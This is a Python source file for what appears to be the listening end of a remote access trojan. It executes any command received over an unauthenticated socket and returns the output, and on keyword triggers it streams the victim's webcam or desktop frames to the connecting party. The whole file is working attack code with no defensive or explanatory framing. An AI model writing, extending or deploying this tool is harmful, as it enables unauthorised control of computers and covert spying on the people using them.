from config import *


def cmd(text: str):
    response = os.popen(text).read()
    return response


def frame_desktop():
    frame = np.array(pyautogui.screenshot())
    frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
    return cv2.resize(frame, (640, 480))


def frame_capture(cap: cv2.VideoCapture):
    status, frame = cap.read()
    cv2.waitKey(1)
    if status:
        return cv2.resize(frame, (640, 480))
    else:
        return frame_capture(cap)


def send_frame(frame: np.array, conn: socket.socket):
    frame_bytes = pickle.dumps(frame, pickle.HIGHEST_PROTOCOL)
    conn.send(frame_bytes)
    return False if conn.recv(4096).decode() == STOP_STREAM_STATUS else True


def stream(port: int, mode: str):
    new_sock = socket.socket()
    new_sock.bind((GLOBAL_IP, port))
    new_sock.listen(10)
    conn, _ = new_sock.accept()
    if mode == WEBCAM_MODE:
        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
        while True:
            frame = frame_capture(cap)
            if not send_frame(frame, conn):
                break
    elif mode == DESKTOP_MODE:
        while True:
            frame = frame_desktop()
            if not send_frame(frame, conn):
                break


def terminal(text: str, conn: socket.socket):
    response = cmd(text)
    conn.send(response.encode())


def controller(text: str, conn: socket.socket):
    if CONTROLLER_WEBCAM in text:
        stream(WEBCAM_PORT, WEBCAM_MODE)
    elif CONTROLLER_DESKTOP in text:
        stream(DESKTOP_PORT, DESKTOP_MODE)
    else:
        terminal(text, conn)


def main():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((GLOBAL_IP, MAIN_PORT))
        s.listen(10)
        connection, address = s.accept()
        while True:
            try:
                command = connection.recv(4096).decode()
                Thread(target=controller, args=(command, connection)).start()
            except ConnectionResetError:
                break
        connection.close()


if __name__ == '__main__':
    main()
